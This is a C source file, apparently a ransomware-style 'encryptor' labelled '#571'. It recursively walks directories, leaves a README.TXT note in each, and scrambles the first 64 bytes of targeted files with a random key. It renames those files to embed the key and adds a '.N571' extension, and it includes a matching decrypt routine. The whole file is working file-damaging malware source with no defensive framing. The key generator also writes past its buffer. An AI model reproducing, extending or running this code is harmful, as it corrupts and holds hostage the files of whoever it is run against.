/* [ENCRYPTOR FROM #571] */

#include "library.h"

/* LIBRARIES */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <time.h>

/* NAMED CONSTANT */
#define MESSAGE "[ENCRYPTOR FROM #571]\n"
#define README  "README.TXT"
#define MYEXTEN ".N571"

#define INSTRUCTION_C "CREATED"
#define INSTRUCTION_E "ENCRYPT"
#define INSTRUCTION_D "DECRYPT"

#define BUFF      2048
#define QUAN_BLOCK  64

/* MODE OF ENCRYPTION */
const INT8 ENCRYPT_MODE = 69;
const INT8 DECRYPT_MODE = 68;

/* FUNCTIONS FROM EXTENS.C */
extern STRING getFirstExten (const STRING const filename);
extern STRING withoutExten  (const STRING const filename);
extern STRING getExten      (const STRING const filename);
extern BOOL   checkExten    (const STRING const exten);

/* CRYPTO FUNCTIONS */
static STRING createKEY  (const UINT8 quan);
static INT8 createREADME (const STRING const dirname);
static INT8 encryptFILE  (
    const STRING const key, 
    const STRING const dirname, 
    const STRING const filename
);
static INT8 decryptFILE (
    const STRING const dirname, 
    const STRING const filename
);
extern INT8 cryptROOT (const INT8 mode, const STRING const dirname);

/* GENERATE KEY */
static STRING createKEY (const UINT8 quan) {
    static UINT16 num = 0;
    srand(time(NULL) + num++);
    auto UINT8 index = 0;
    auto STRING const key = (STRING)malloc(quan * sizeof(INT8));
    while (index < quan)
        *(key + index++) = rand() % 75 + 52;
    *(key + index) = END_OF_STRING;
    return key;
}

/* README TXT */
static INT8 createREADME (const STRING const dirname) {
    auto INT8 fullPath[BUFF];
    snprintf(fullPath, BUFF, "%s/%s", dirname, README);
    auto FILE* const file = fopen(fullPath, "w");
    if (file IS_NOT NULL) {
        fprintf(file, MESSAGE);
        fclose(file);
    } else return 1;
    return 0;
}

/* ENCRYPT FILE */
static INT8 encryptFILE (
    const STRING const key, 
    const STRING const dirname, 
    const STRING const filename
) {
    auto STRING const exten = getExten(filename);
    if (exten IS_NOT NULL AND checkExten(exten)) {
        auto INT8 fullPath[BUFF];
        snprintf(fullPath, BUFF, "%s/%s", dirname, filename);
        auto FILE* const file = fopen(fullPath,"r+b");
        if (file IS_NOT NULL) {
            register INT16 c;
            register UINT8 index = 0;
            while((c = getc(file)) IS_NOT EOF) {
                if (index < QUAN_BLOCK) {
                    fseek(file, index++, SEEK_SET);
                    putc(c + *(key + ((index-1)%QUAN_BLOCK)), file);
                } else break;
            } fclose(file);
        } else return 1;
        auto INT8 buffer[BUFF];
        snprintf(buffer, BUFF, "%s/%s%s%s", dirname, key, exten, MYEXTEN);
        free(exten);
        rename(fullPath, buffer);
    } else return -1;
    return 0;
}

/* DECRYPT FILE */
static INT8 decryptFILE (
    const STRING const dirname,
    const STRING const filename
) {
    auto STRING const exten = getExten(filename);
    if (exten IS_NOT NULL AND NOT strcmp(exten,MYEXTEN)) { free(exten);
        auto INT8 fullPath[BUFF];
        snprintf(fullPath, BUFF, "%s/%s", dirname, filename);
        auto STRING const key = withoutExten(filename);
        auto FILE* const file = fopen(fullPath,"r+b");
        if (file IS_NOT NULL) {
            register INT16 c;
            register UINT8 index = 0;
            while((c = getc(file)) IS_NOT EOF) {
                if (index < QUAN_BLOCK) {
                    fseek(file, index++, SEEK_SET);
                    putc(c - *(key + ((index-1)%QUAN_BLOCK)), file);
                } else break;
            } fclose(file);
        } else return 1;
        auto INT8 buffer[BUFF];
        auto STRING const fexten = getFirstExten(filename);
        snprintf(buffer, BUFF, "%s/%s%s", dirname, key, fexten);
        free(key); free(fexten);
        rename(fullPath, buffer);
    } else return -1;
    return 0;
}

/* [ ENCRYPT | DECRYPT ] ROOT OF DIR */
extern INT8 cryptROOT (const INT8 mode, const STRING const dirname) {
    auto DIR* const directory = opendir(dirname);
    if (directory IS_NOT NULL) {
        if (mode IS ENCRYPT_MODE) {
            createREADME(dirname)
            #ifdef DEBUG
                ?DEBUG_FAILURE(INSTRUCTION_C)
                :DEBUG_SUCCESS(INSTRUCTION_C)
            #endif
        ;}
        while (TRUE) {
            const auto struct dirent* const entry = readdir(directory);
            if (entry IS_NOT NULL) {
                const auto STRING const filename = entry->d_name;
                if (NOT(entry->d_type & DT_DIR) AND strcmp(filename, README)) {
                    if (mode IS ENCRYPT_MODE) {
                        encryptFILE(createKEY(QUAN_BLOCK), dirname, filename)
                        #ifdef DEBUG
                            ?DEBUG_FAILURE(INSTRUCTION_E)
                            :DEBUG_SUCCESS(INSTRUCTION_E)
                        #endif
                    ;} else {
                        decryptFILE(dirname, filename)
                        #ifdef DEBUG
                            ?DEBUG_FAILURE(INSTRUCTION_D)
                            :DEBUG_SUCCESS(INSTRUCTION_D)
                        #endif
                    ;}
                } if (
                        (entry->d_type & DT_DIR) AND 
                        strcmp(filename, "..") AND 
                        strcmp(filename, ".")
                    ) {
                    auto INT8 path[BUFF];
                    if (snprintf(path, BUFF, "%s/%s", dirname, filename) >= BUFF) 
                        return 2;
                    cryptROOT(mode, path);
                }
            } else break;
        }
    } else return 1;
    if (closedir(directory)) return -1;
    return 0;
}
